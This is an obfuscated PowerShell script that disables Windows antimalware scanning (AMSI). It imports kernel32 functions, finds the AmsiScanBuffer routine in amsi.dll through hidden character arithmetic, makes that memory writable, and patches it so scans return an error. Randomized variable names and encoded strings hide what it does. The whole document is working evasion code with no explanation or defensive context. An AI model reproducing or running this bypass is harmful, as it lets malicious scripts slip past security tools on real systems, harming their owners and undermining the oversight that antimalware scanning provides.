$UbuQqtqY_3scLI8_Tx = @"
using System;
using System.Runtime.InteropServices;
public class UbuQqtqY_3scLI8_Tx {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr Me6GJW3Aa, string C1j);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr xr8Keghp0r4SzujeuyX, UIntPtr He8VtNyfpWAQoa7r, uint Cr8NX11hkYdtuTmuMs, out uint Einq6_iIEdLOJHg5HWW1);
}
"@

Add-Type $UbuQqtqY_3scLI8_Tx

$v69EHQgapz4c5nsCzLS = [UbuQqtqY_3scLI8_Tx]::LoadLibrary("$(('äm'+'sî'+'.d'+'ll').NOrMALIZE([chAR]([bYTe]0x46)+[ChAr](111+83-83)+[CHAR](90+24)+[cHaR](109+5-5)+[CHaR]([bYtE]0x44)) -replace [char]([BYTE]0x5c)+[CHAR](112+13-13)+[cHar]([BYtE]0x7b)+[cHAR](77)+[CHar]([bytE]0x6e)+[chAR](72+53))")
$VU7tium4YIchcT = [UbuQqtqY_3scLI8_Tx]::GetProcAddress($v69EHQgapz4c5nsCzLS, "$([CHAr]([Byte]0x41)+[CHAr]([bYTE]0x6d)+[Char]([bYTE]0x73)+[chAr](105)+[CHAr]([ByTe]0x53)+[cHAr]([bYte]0x63)+[CHar]([byTe]0x61)+[CHAR]([bYTe]0x6e)+[char](66*3/3)+[cHAR](75+42)+[cHAR]([bYTE]0x66)+[cHAR](87+15)+[cHaR]([bYTE]0x65)+[cHaR]([BYte]0x72))")
$p = 0
[UbuQqtqY_3scLI8_Tx]::VirtualProtect($VU7tium4YIchcT, [uint32]5, 0x40, [ref]$p)
$AKSZ3GwoyVe5DlO_ = "0xB8"
$U4NXvpyyE9Iw1Z = "0x57"
$kIbaW3OA32dlQjA = "0x00"
$IfoUi6OZNeQ44a = "0x07"
$nGHo0 = "0x80"
$fy1gcwzFy1wcg2nv0W = "0xC3"
$iAYYXBLfyETuaiB = [Byte[]] ($AKSZ3GwoyVe5DlO_,$U4NXvpyyE9Iw1Z,$kIbaW3OA32dlQjA,$IfoUi6OZNeQ44a,+$nGHo0,+$fy1gcwzFy1wcg2nv0W)
[System.Runtime.InteropServices.Marshal]::Copy($iAYYXBLfyETuaiB, 0, $VU7tium4YIchcT, 6)